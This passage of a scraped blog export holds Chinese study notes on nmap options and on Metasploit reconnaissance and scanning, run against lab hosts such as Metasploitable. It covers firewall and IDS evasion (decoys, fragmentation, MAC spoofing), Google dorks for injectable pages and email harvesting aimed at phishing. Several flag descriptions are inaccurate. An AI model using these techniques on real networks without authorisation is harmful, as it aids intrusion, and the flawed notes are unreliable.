192.168.1-100.* //扫描子网 nmap 192.168.43.1/24 //扫描整个子网(24:闪光CIDR标记) cat list //先查看已经存储好的IP列表 nmap -iL list.txt //扫描上述列表 3.扫描网络并排除特定的目标nmap -iR 3 //随机扫描 nmap 192.168.43.0/24 --exclude 192.168.43.80 //扫描排除192.168.43.80之外的在192.168.43.0网络中的IP nmap 192.168.43.0/24 --exclude 192.168.43.80-90 nmap 192.168.43.0/24 --excludefile list.txt 4.扫描开放网络端口nmap -A 192.168.43.80 //调用一些集成的命令，-o 识别远程操作系统；-sC 运行默认的脚本扫描 nc 192.168.43.80 23.......//如果我的电脑开了netcat，这样可以登录192.168.43.64（一般是64）这台惠普的电脑 5.使用可选包扫描网络nmap -PN 192.168.43.80 //跳过第一次ping尝试，然后对目标进行扫描(Don&apos;t ping),扫描安全级别更高的目标 nmap -sP 192.168.43.0/24 //Simple ping只通过ping来扫描 nmap -PS 192.168.43.80 //使用TCP SYN协议来发送SYN数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行） nmap -PS22,80,443 192.168.43.80 //可以添加不同的端口进行发送扫描 nmap -PS 192.168.43.80 //使用TCP ACK协议来发送ACK数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行） nmap -PU 192.168.43.80 //使用UDP协议来发送数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行） nmap -PY 192.168.43.80 //使用CTP协议来发送数据包，而不是ICMP（如果目标地址的ICMP被阻塞了，这个命令依旧能够执行） nmap -PE 192.168.43.80 //不设置时就默认使用-PE(ICMP Address Mask Ping，ICMP地址掩码嗅探)嗅探ICMP nmap -PP 192.168.43.80 //一个ICMP时间戳嗅探命令，嗅探被防火墙保护的目标 nmap -PO 192.168.43.80 //代表IP协议，发送特定的协议找到目标 nmap -PO1,2,4 192.168.43.80 //代表IP协议，发送特定的协议找到目标(1:ICMP;2:IGMP;4:IP) namp -PR 192.168.43.80 //ping命令，速度 快精准，防火墙无法拦截，当目标不在本地网络时不能使用 nmap --traceroute 192.168.43.80 //路由跟踪 nmap -R 192.168.43.80 //TAC选项实验DNS反向查找 nmap --system-dns 192.168.43.80 //DNS查找，他使用主机系统和DNS自己的解析器 nmap --dns-servers 208.67.222.222,208.84.54.222 192.168.43.80 //指定DNS服务器查找，绕过了本地系统中默认配置的DND服务器 nmap -SL 192.168.43.80 //创建一个主机列表，用来确定目标的IP地址和DNS名称，但不向目标发送任何数据包 6.先进的扫描技术nmap -sS 192.168.43.80 //TCP SYN链接扫描 nmap -sT 192.168.43.80 //tcp链接，针对没有root权限的用户 nmap -sU(or sF) 192.168.43.80 //得到使用者的UDP协议的数据包 nmap -n 192.168.43.80 //在tcp节点的扫描 nmap -sF 192.168.43.80 //从目标的包中获取一些tcp信息 nmap -sX 192.168.43.80 //Exmouth扫描 nmap -scanflags ACKPSH //用你自己选择的包运行用户扫描（链接ACKPSH，可以通过输入ac来避免紧急的危害或用G来紧急重置，rst用来重置） nmap -sO(or s/ a/ A) 192.168.43.80 //TCP扫描，可发现目标是否被防火墙保护 nmap --send-eth 192.168.43.80 //??? nmap --send-ip 192.168.43.80 //改变本机使用原始IP数据包 7.端口扫描选项nmap -F 192.168.43.80 //快速扫描 nmap -p 80 192.168.43.80 //扫描特定的端口 nmap -p 80,23,8080,443-555 192.168.43.80 nmap -p http 192.168.43.80 //扫描http服务 nmap -p &quot;sm&quot; 192.168.43.80 //扫描所有含有“sm”的协议 nmap -sU -sT -p U:53,T:25 192.168.43.80 //和之前的一样，这里只是用U,T指定了端口 nmap -p &quot;*&quot; 192.168.43.80 //扫描所有 nmap --top-ports 54 192.168.43.80 //常用端口，54：端口号 nmap -r -v 192.168.43.80 //顺序扫描（入侵防火墙时有用，或者逃避检查）v:显示不安全的报告 8.系统检测nmap -O 192.168.43.80 //检测操作系统 nmap -V 192.168.43.80 //SYN扫描，获取系统信息 nmap -O --osscan-guess 192.168.43.80 //nmap不能识别是什么操作系统时，这个命令显示最大可能性的操作系统 nmap --fuzzy 192.168.43.80 //显示最大可能性的操作系统 nmap -sV 192.168.43.80 //目标哪些服务在运行 nmap -sV --version-trace 192.168.43.80 //目标哪些服务在运行，并且检测服务版本 nmap -sR 192.168.43.80 //RPC scan远程程序调用扫描 9.时间选项nmap -T0 192.168.43.80 //-T0控制扫描的速度0：最慢；5：最快（同时开启几个端口进行扫描） nmap -max-parallelism 4 (or -mix-parallelism) 192.168.43.80 //控制扫描速度，最大端口数为上面设置的4 nmap -min-hostgroup (or -max-hostgroup) 10 192.168.43.1/24 //最少同时扫描10个主机 nmap -initial-rtt-timeout 6000 192.168.43.80 //修改RTT超时值(毫秒，默认为10秒 nmap --max-retries 3 192.168.43.80 //尝试3次之后放弃 nmap --ttl 100 192.168.43.80 //TTL数据包的选择 nmap --host-timeout 1m 192.168.43.80 //在指定时间内回应主机 nmap --scan- delay 10s 192.168.43.80 //设置探针之间的时间延迟（有利于提高每个命令的准确性，但速度较慢） nmap --max-scan-delay 20s 192.168.43.80 //设置最大扫描延迟 nmap --min-rate 50 192.168.43.80 //设置nmap数据包每秒最低发送量:50(数量过高可能导致结果不准确) nmap --max-rate 10 192.168.43.80 //想做系统上的偷袭，避免一些探测系统的最大数据包速率的选择,降低扫描速率（每秒最多10个） nmap --defeat-rst-ratelimit 192.168.43.80 //请求复位数据包（如果解除复位率限制，一些目标可能袭击RST包） 10.和防火墙的乐趣nmap -f 192.168.43.80 //这个命令发送小于8个字节的探针，去扫描，任何防火墙和入侵检测系统都无法发现 nmap --mtu 8 192.168.43.80 //规定了最大传输单位（可以设置为任何8的倍数），也可以在这个命令中加上 send ETH nmap -D RND:10 192.168.43.80 //诱饵选项，是你的扫描使用许多伪装的IP，所以这个命令发送几个数据包到目的地，但是对于目标而言，却是统一时间被不同的机器扫描 nmap -sL 伪装地址(ip) 192.168.43.80 //使用伪装地址嗅探 nmap --source-port 54 192.168.43.80 //指定端口号（54）扫描 nmap --data-length 25 192.168.43.80 //加了一些探测数据包的随机数据，因为有时目标寻找特定大小的包去接受，几乎可以得到任何你想看到的字节大小，做一个特定的大小取决于特定的目标（你想进入的） namp --randomize-hosts 192.168.43.80-160 //随机化你的目标，通过使用不同的脚本,遍历80到160，不泄露一些网络设备的MAC地址 nmap -sT -PN --spoof -mac 0 192.168.43.80 //0的结尾是告诉nmap生成随机行为，无论什么扫描， nmap --badsum 192.168.43.80 //最后给检测者发送假的内容 11.如何输出文件nmap -oN scan.txt 192.168.43.1/24 //将扫描的结果保存在scan.txt中，也可以使用--append -output在txt文件中修改名称 nmap -oX scan.xml 192.168.43.1/24 //将扫描的结果保存在scan.xml中 nmap -oG scantron.txt 192.168.43.1/24 //将扫描的结果保存在scan.txt中，使用 grep &quot;microsoft&quot; scantron.txt 查看文件中的“”指定内容 nmap -oA scan2 192.168.43.1/24 //生成多个文件.xml .nmap(.txt) .gnmap(.grep) 12.如何使用排错选项nmap -h //获取帮助 man nmap //查看使用手册 nmap -v //查看版本 nmap -d 192.168.43.80 //nmap调试(-d1:调试数量最小；-d9:调试数量最大，耗时长) nmap --reason 192.168.43.80 //查看端口状态(conn-refused:拒绝;syn-acked:打开) nmap --open 192.168.43.80 //扫描打开的端口，忽略关闭的 nmap --packet-trace 192.168.43.80 //展示扫描过程中发送或者接收的包 nmap --packet-trace test.txt 192.168.43.80 //展示扫描过程中发送或者接收的包，并保存在txt中（文件名添加在命令最后，是在IP之后还是上面写的那样???） nmap -iflist //展示那些配置在你电脑上的网络接口和路由信息 nmap -e wlan0(or eth0,eth1,wlan1) 192.168.43.80 //指定扫描的目标的特定网络接口类型 13.nmap脚本引擎（Lua语言） 使用终端进入nmap的目录scripts，运行相关脚本，有400多个脚本，功能需要自己了解（百度） nmap --script banner 192.168.43.80 //通过连接开放的TCP端口，实现Banner劫持，然后输出所有信息 nmap --script &quot;http*&quot; 192.168.43.80 //执行你的脚本库中有“http”或者别的码字的脚本，进行扫描,输出脚本文件预置的信息 nmap --script default 192.168.43.80 //使用默认的脚本进行扫描 nmap --script ftp-anon --script-trace -p 21 192.168.43.80 //在使用脚本时遇到问题，使用ftp-anon脚本，在nmap连接21端口时，追踪nmap的运行 nmap --script-updatedb //升级 14.Zenmap内部结构 target:目标IP profile:选择命令 scan:开始扫描 Hosts:列出所有扫描的目标 Services:运行的服务 自己玩吧 15.NDiff和技巧ndiff test.xml test2.xml //比较两个文件（-：第一个文件；+：第二个文件，你可以看到他们的不同与相同之处） ndiff -v test1.xml test2.xml //查看详细信息 ndiff --xml //在屏幕上输出xml的输出信息，信息进入一个新的xml文件 nmap 192.168.43.0/24 //运行交互，在运行过程中按 v:显示详细过程信息，d：调试信息；p：查看追包","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Nmap/"}]},{"title":"Metasploit魔鬼训练营笔记","slug":"Metasploit魔鬼训练营笔记","date":"2019-01-13T22:10:13.000Z","updated":"2019-01-13T22:11:00.702Z","comments":true,"path":"2019/01/14/Metasploit魔鬼训练营笔记/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit魔鬼训练营笔记/","excerpt":"","text":"Metasploit魔鬼训练营 外围信息收集 whois域名查询1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162msf &gt; whois testfire.net[*] exec: whois testfire.net Domain Name: TESTFIRE.NET Registry Domain ID: 8363973_DOMAIN_NET-VRSN Registrar WHOIS Server: whois.corporatedomains.com Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html Updated Date: 2017-07-19T05:16:54Z Creation Date: 1999-07-23T13:52:32Z Registry Expiry Date: 2018-07-23T13:52:32Z Registrar: CSC Corporate Domains, Inc. Registrar IANA ID: 299 Registrar Abuse Contact Email: domainabuse@cscglobal.com Registrar Abuse Contact Phone: 8887802723 Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited Name Server: ASIA3.AKAM.NET Name Server: EUR2.AKAM.NET Name Server: EUR5.AKAM.NET Name Server: NS1-206.AKAM.NET Name Server: NS1-99.AKAM.NET Name Server: USC2.AKAM.NET Name Server: USC3.AKAM.NET Name Server: USW2.AKAM.NET DNSSEC: unsigned URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/&gt;&gt;&gt; Last update of whois database: 2017-10-25T00:31:59Z &lt;&lt;&lt;For more information on Whois status codes, please visit https://icann.org/eppNOTICE: The expiration date displayed in this record is the date theregistrar&apos;s sponsorship of the domain name registration in the registry iscurrently set to expire. This date does not necessarily reflect the expirationdate of the domain name registrant&apos;s agreement with the sponsoringregistrar. Users may consult the sponsoring registrar&apos;s Whois database toview the registrar&apos;s reported date of expiration for this registration.TERMS OF USE: You are not authorized to access or query our Whoisdatabase through the use of electronic processes that are high-volume andautomated except as reasonably necessary to register domain names ormodify existing registrations; the Data in VeriSign Global RegistryServices&apos; (&quot;VeriSign&quot;) Whois database is provided by VeriSign forinformation purposes only, and to assist persons in obtaining informationabout or related to a domain name registration record. VeriSign does notguarantee its accuracy. By submitting a Whois query, you agree to abideby the following terms of use: You agree that you may use this Data onlyfor lawful purposes and that under no circumstances will you use this Datato: (1) allow, enable, or otherwise support the transmission of massunsolicited, commercial advertising or solicitations via e-mail, telephone,or facsimile; or (2) enable high volume, automated, electronic processesthat apply to VeriSign (or its computer systems). The compilation,repackaging, dissemination or other use of this Data is expresslyprohibited without the prior written consent of VeriSign. You agree not touse electronic processes that are automated and high-volume to access orquery the Whois database except as reasonably necessary to registerdomain names or modify existing registrations. VeriSign reserves the rightto restrict your access to the Whois database in its sole discretion to ensureoperational stability. VeriSign may restrict or terminate your access to theWhois database for failure to abide by these terms of use. VeriSignreserves the right to modify these terms at any time.The Registry database contains ONLY .COM, .NET, .EDU domains andRegistrars. nslookup域名查询123456789root@bt:~# nslookup&gt; set type=A&gt; testfire.netServer: 10.10.10.2Address: 10.10.10.2#53Non-authoritative answer:Name: testfire.netAddress: 65.61.137.117 dig域名查询root@bt:~# dig @ns.watson.ibm.com testfire.net IP2Location地理位置查询1234[GeoIP服务](http://www.maxmind.com)可通过这个网站上的经纬度，使用google地图进行定位[QQc纯真数据库](http://www.cz88.net) netcraft网站提供信息查询服务123[netcraft](http://searchdns.netcraft.com)搜索“testfire.net”--&gt;点击“lookup!”获取更加详细的信息:(http://toolbar.netcraft.com/site_report?url=http://www.testfire.net) IP2Domain反查域名1234[旁注](http://www.ip-adress.com/reversr_ip)因为一台服务器上可能运行多台虚拟机，使用不同的域名，但是用相同的IP，可以通过旁注获取其他网站的控制权，进而 实现迂回渗透的目的[国内的反查询网址](http://www.7c.com) 搜索引擎信息查询1234[Google黑客数据库](http://www.exploit-db.com/google-dorks)两款自动查询工具：SiteDigger:Dwnload at (http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx)Search Diggity:Download at (http://www.stachliu.com) 搜索网站目录结构直接在google中搜索123456parent directory site:testfire.net 留意的几种文件类型： inc:网站配置信息，数据库用户名/口令 bak:文本编辑器编辑后留下的备份文件，方便理解程序的内容 txt/sql:一般包含SQL脚本，透漏数据库结构信息 使用metasploit中的模块12345678910111213141516msf &gt; search dir_scannerMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/scanner/http/dir_scanner normal HTTP Directory Scannermsf &gt; use auxiliary/scanner/http/dir_scannermsf auxiliary(dir_scanner) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(dir_scanner) &gt; set RHOST www.testfire.netRHOST =&gt; www.testfire.netmsf auxiliary(dir_scanner) &gt; exploit 检索特定类型的文件直接在google中搜索1site:testfire.net filetype:xls 搜索网站中的Email地址12345678msf auxiliary(dir_scanner) &gt; use auxiliary/gather/search_email_collectormsf auxiliary(search_email_collector) &gt; set DOMAIN altoromutual.comDOMAIN =&gt; altoromutual.commsf auxiliary(search_email_collector) &gt; run[*] Harvesting emails .....[*] Searching Google for email addresses from altoromutual.com通过对邮件地址的查询，结合社工的方式，对被攻击者更有效的实施钓鱼 搜索存在SQL注入的页面直接在google搜索中搜索12site:testfire.net inurl:login此网站存在注入点，输入字符未过滤 IP地址路由侦查1234567891011121314151617181920212223242526272829303132root@bt:~# traceroute 202.112.50.74traceroute to 202.112.50.74 (202.112.50.74), 30 hops max, 60 byte packets 1 bogon (10.10.10.2) 0.215 ms 0.128 ms 0.143 ms 2 * * * 3 * * * 4 * * * 5 * * * 6 * * * 7 * * * 8 * * * 9 * * *10 * * *11 * * *12 * * *13 * * *14 * * *15 * * *16 * * *17 * * *18 * * *19 * * *20 * * *21 * * *22 * * *23 * * *24 * * *25 * * *26 * * *27 * * *28 * * *29 * * *30 * * * 主机探测与端口扫描Ping命令1234567891011root@bt:~# ping -c 5 www.dvssc.comPING www.dvssc.com (10.10.10.129) 56(84) bytes of data.64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=1 ttl=64 time=2.28 ms64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=2 ttl=64 time=0.549 ms64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=3 ttl=64 time=0.513 ms64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=4 ttl=64 time=0.633 ms64 bytes from www.dvssc.com (10.10.10.129): icmp_seq=5 ttl=64 time=0.525 ms--- www.dvssc.com ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4000msrtt min/avg/max/mdev = 0.513/0.901/2.287/0.694 ms Metasploit主机发现模块arp_sweep12345678910111213141516171819202122232425262728293031323334353637383940msf &gt; search arp_sweep[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/scanner/discovery/arp_sweep normal ARP Sweep Local Network Discoverymsf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(arp_sweep) &gt; show optionsModule options (auxiliary/scanner/discovery/arp_sweep): Name Current Setting Required Description ---- --------------- -------- ----------- INTERFACE no The name of the interface RHOSTS yes The target address range or CIDR identifier SHOST no Source IP Address SMAC no Source MAC Address THREADS 1 yes The number of concurrent threads TIMEOUT 5 yes The number of seconds to wait for new datamsf auxiliary(arp_sweep) &gt; set RHOSTS 10.10.10.0/24RHOSTS =&gt; 10.10.10.0/24msf auxiliary(arp_sweep) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(arp_sweep) &gt; run[*] 10.10.10.1 appears to be up (VMware, Inc.).[*] 10.10.10.2 appears to be up (VMware, Inc.).[*] 10.10.10.128 appears to be up (VMware, Inc.).[*] 10.10.10.129 appears to be up (VMware, Inc.).[*] 10.10.10.130 appears to be up (VMware, Inc.).[*] 10.10.10.254 appears to be up (VMware, Inc.).[*] 10.10.10.254 appears to be up (VMware, Inc.).[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed udp_sweep12345678910111213141516msf auxiliary(arp_sweep) &gt; use auxiliary/scanner/discovery/udp_sweepmsf auxiliary(udp_sweep) &gt; set RHOSTS 10.10.10.0/24RHOSTS =&gt; 10.10.10.0/24msf auxiliary(udp_sweep) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(udp_sweep) &gt; run[*] Sending 13 probes to 10.10.10.0-&gt;10.10.10.255 (256 hosts)[*] Discovered NetBIOS on 10.10.10.129:137 (OWASPBWA:&lt;00&gt;:U :OWASPBWA:&lt;03&gt;:U :OWASPBWA:&lt;20&gt;:U :\u0001\u0002__MSBROWSE__\u0002:&lt;01&gt;:G :WORKGROUP:&lt;1d&gt;:U :WORKGROUP:&lt;1e&gt;:G :WORKGROUP:&lt;00&gt;:G :00:00:00:00:00:00)[*] Discovered NetBIOS on 10.10.10.254:137 (METASPLOITABLE:&lt;00&gt;:U :METASPLOITABLE:&lt;03&gt;:U :METASPLOITABLE:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :00:00:00:00:00:00)[*] Discovered NetBIOS on 10.10.10.1:137 (LIXU-PC:&lt;00&gt;:U :WORKGROUP:&lt;00&gt;:G :LIXU-PC:&lt;20&gt;:U :00:50:56:c0:00:08)[*] Discovered DNS on 10.10.10.2:53 (af67818000010001000000000756455253494f4e0442494e440000100003c00c0010000300000005000d0c646e736d6173712d322e3531)[*] Discovered NetBIOS on 10.10.10.130:137 (ROOT-TVI862UBEH:&lt;00&gt;:U :ROOT-TVI862UBEH:&lt;20&gt;:U :WORKGROUP:&lt;00&gt;:G :WORKGROUP:&lt;1e&gt;:G :00:0c:29:94:e4:0e)[*] Discovered DNS on 10.10.10.254:53 (BIND 9.4.2)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed Nmap扫描123456789101112131415161718192021222324252627msf &gt; nmap -PU -sn 10.10.10.0/24[*] exec: nmap -PU -sn 10.10.10.0/24Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-25 10:56 CSTNmap scan report for bogon (10.10.10.1)Host is up (0.00062s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for bogon (10.10.10.2)Host is up (0.00056s latency).MAC Address: 00:50:56:FE:22:F7 (VMware)Nmap scan report for bogon (10.10.10.128)Host is up (0.00082s latency).MAC Address: 00:0C:29:46:81:2D (VMware)Nmap scan report for bogon (10.10.10.129)Host is up (0.00079s latency).MAC Address: 00:0C:29:BA:5B:04 (VMware)Nmap scan report for bogon (10.10.10.130)Host is up (0.00066s latency).MAC Address: 00:0C:29:94:E4:0E (VMware)Nmap scan report for bogon (10.10.10.254)Host is up (0.00052s latency).MAC Address: 00:50:56:FD:FB:5C (VMware)Nmap scan report for bogon (10.10.10.200)Host is up.Nmap done: 256 IP addresses (7 hosts up) scanned in 3.91 seconds还有很多使用方法在其他笔记里 操作系统辨识1234567891011121314151617181920212223242526msf &gt; nmap -sV 10.10.10.254[*] exec: nmap -sV 10.10.10.254Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-25 11:08 CSTNmap scan report for bogon (10.10.10.254)Host is up (0.000064s latency).Not shown: 988 closed portsPORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.122/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)23/tcp open telnet Linux telnetd25/tcp open smtp Postfix smtpd53/tcp open domain ISC BIND 9.4.280/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)3306/tcp open mysql MySQL 5.0.51a-3ubuntu55432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.78009/tcp open ajp13 Apache Jserv (Protocol v1.3)8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1MAC Address: 00:0C:29:D7:13:2A (VMware)Service Info: Host: metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds 端口扫描与服务类型探测 Metasploit中的端口扫描器1234567891011121314151617181920212223242526272829303132333435363738394041msf &gt; search portscan[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/scanner/http/wordpress_pingback_access normal Wordpress Pingback Locator auxiliary/scanner/natpmp/natpmp_portscan normal NAT-PMP External Port Scanner auxiliary/scanner/portscan/ack normal TCP ACK Firewall Scanner auxiliary/scanner/portscan/ftpbounce normal FTP Bounce Port Scanner auxiliary/scanner/portscan/syn normal TCP SYN Port Scanner auxiliary/scanner/portscan/tcp normal TCP Port Scanner auxiliary/scanner/portscan/xmas normal TCP &quot;XMas&quot; Port Scanner auxiliary/scanner/sap/sap_router_portscanner normal SAPRouter Port Scannermsf &gt; use auxiliary/scanner/portscan/synmsf auxiliary(syn) &gt; set RHOSTS 10.10.10.254RHOSTS =&gt; 10.10.10.254msf auxiliary(syn) &gt; set THREADS 20THREADS =&gt; 20msf auxiliary(syn) &gt; run[*] TCP OPEN 10.10.10.254:21[*] TCP OPEN 10.10.10.254:22[*] TCP OPEN 10.10.10.254:23[*] TCP OPEN 10.10.10.254:25[*] TCP OPEN 10.10.10.254:53[*] TCP OPEN 10.10.10.254:80[*] TCP OPEN 10.10.10.254:139[*] TCP OPEN 10.10.10.254:445[*] TCP OPEN 10.10.10.254:3306[*] TCP OPEN 10.10.10.254:3632[*] TCP OPEN 10.10.10.254:5432[*] TCP OPEN 10.10.10.254:8009[*] TCP OPEN 10.10.10.254:8180[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Nmap端口扫描1234567891011121314151617181920212223242526272829303132msf &gt; nmap -sV -Pn 10.10.10.129[*] exec: nmap -sV -Pn 10.10.10.129Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-26 08:33 CSTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 10.10.10.129Host is up (0.00013s latency).Not shown: 992 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.2.222/tcp open ssh OpenSSH 5.3p1 Debian 3ubuntu4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.2.14 ((Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.5 with Suhosin-Patch mod_python/3.3.1 Python/2.6.5 mod_perl/2.0.4 Perl/v5.10.1)139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)143/tcp open imap Courier Imapd (released 2008)445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)5001/tcp open java-rmi Java RMI8080/tcp open http-proxy?2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port5001-TCP:V=7.01%I=7%D=10/26%Time=59F12D51%P=x86_64-pc-linux-gnu%r(NSF:ULL,4,&quot;\\xac\\xed\\0\\x05&quot;);==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8080-TCP:V=7.01%I=7%D=10/26%Time=59F12D65%P=x86_64-pc-linux-gnu%r(SSF:ocks5,6F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nServer:\\x20Apache-CoyotSF:e/1\\.1\\r\\nDate:\\x20Thu,\\x2026\\x20Oct\\x202017\\x2000:33:41\\x20GMT\\r\\nConnSF:ection:\\x20close\\r\\n\\r\\n&quot;);MAC Address: 00:0C:29:BA:5B:04 (VMware)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 60.03 seconds Back Track12Autoscan工具使用方法P90 服务的扫描与查点 Metasploit提供的模块123456789101112131415161718192021222324252627282930313233343536373839msf &gt; search _version[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/fuzzers/ssh/ssh_version_15 normal SSH 1.5 Version Fuzzer auxiliary/fuzzers/ssh/ssh_version_2 normal SSH 2.0 Version Fuzzer auxiliary/fuzzers/ssh/ssh_version_corrupt normal SSH Version Corruption auxiliary/gather/ibm_sametime_version 2013-12-27 normal IBM Lotus Sametime Version Enumeration auxiliary/scanner/db2/db2_version normal DB2 Probe Utility auxiliary/scanner/ftp/ftp_version normal FTP Version Scanner auxiliary/scanner/h323/h323_version normal H.323 Version Scanner auxiliary/scanner/http/coldfusion_version normal ColdFusion Version Scanner auxiliary/scanner/http/http_version normal HTTP Version Detection auxiliary/scanner/http/joomla_version normal Joomla Version Scanner auxiliary/scanner/http/sap_businessobjects_version_enum normal SAP BusinessObjects Version Detection auxiliary/scanner/http/ssl_version 2014-10-14 normal HTTP SSL/TLS Version Detection (POODLE scanner) auxiliary/scanner/imap/imap_version normal IMAP4 Banner Grabber auxiliary/scanner/ipmi/ipmi_version normal IPMI Information Discovery auxiliary/scanner/lotus/lotus_domino_version normal Lotus Domino Version auxiliary/scanner/mysql/mysql_version normal MySQL Server Version Enumeration auxiliary/scanner/oracle/tnslsnr_version 2009-01-07 normal Oracle TNS Listener Service Version Query auxiliary/scanner/pop3/pop3_version normal POP3 Banner Grabber auxiliary/scanner/postgres/postgres_version normal PostgreSQL Version Probe auxiliary/scanner/printer/printer_version_info normal Printer Version Information Scanner auxiliary/scanner/sap/sap_mgmt_con_version normal SAP Management Console Version Detection auxiliary/scanner/scada/digi_addp_version normal Digi ADDP Information Discovery auxiliary/scanner/scada/digi_realport_version normal Digi RealPort Serial Server Version auxiliary/scanner/smb/smb_version normal SMB Version Detection auxiliary/scanner/smtp/smtp_version normal SMTP Banner Grabber auxiliary/scanner/snmp/aix_version normal AIX SNMP Scanner Auxiliary Module auxiliary/scanner/ssh/ssh_version normal SSH Version Scanner auxiliary/scanner/telnet/lantronix_telnet_version normal Lantronix Telnet Service Banner Detection auxiliary/scanner/telnet/telnet_version normal Telnet Service Banner Detection auxiliary/scanner/vmware/vmauthd_version normal VMWare Authentication Daemon Version Scanner auxiliary/scanner/vxworks/wdbrpc_version normal VxWorks WDB Agent Version Scanner Telnet服务扫描123456789101112131415161718msf &gt; use auxiliary/scanner/telnet/telnet_version msf auxiliary(telnet_version) &gt; set RHOSTS 10.10.10.0/24RHOSTS =&gt; 10.10.10.0/24msf auxiliary(telnet_version) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(telnet_version) &gt; run[*] Scanned 39 of 256 hosts (15% complete)[*] Scanned 52 of 256 hosts (20% complete)[*] Scanned 95 of 256 hosts (37% complete)[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 138 of 256 hosts (53% complete)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 185 of 256 hosts (72% complete)[*] Scanned 205 of 256 hosts (80% complete)[*] Scanned 235 of 256 hosts (91% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed SSH服务扫描1234567891011121314151617181920msf &gt; use auxiliary/scanner/ssh/ssh_versionmsf auxiliary(ssh_version) &gt; set RHOSTS 10.10.10.0/24RHOSTS =&gt; 10.10.10.0/24msf auxiliary(ssh_version) &gt; set THREADS 100THREADS =&gt; 100msf auxiliary(ssh_version) &gt; run[*] Scanned 101 of 256 hosts (39% complete)[*] 10.10.10.129:22 SSH server version: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4 ( service.version=5.3p1 openssh.comment=Debian-3ubuntu4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=10.04 )[*] Scanned 111 of 256 hosts (43% complete)[*] Scanned 157 of 256 hosts (61% complete)[*] 10.10.10.254:22 SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 ( service.version=4.7p1 openssh.comment=Debian-8ubuntu1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=8.04 )[*] Scanned 197 of 256 hosts (76% complete)[*] Scanned 198 of 256 hosts (77% complete)[*] Scanned 199 of 256 hosts (77% complete)[*] Scanned 200 of 256 hosts (78% complete)[*] Scanned 213 of 256 hosts (83% complete)[*] Scanned 237 of 256 hosts (92% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed Oracle数据库服务查点12345678910111213141516171819msf &gt; use 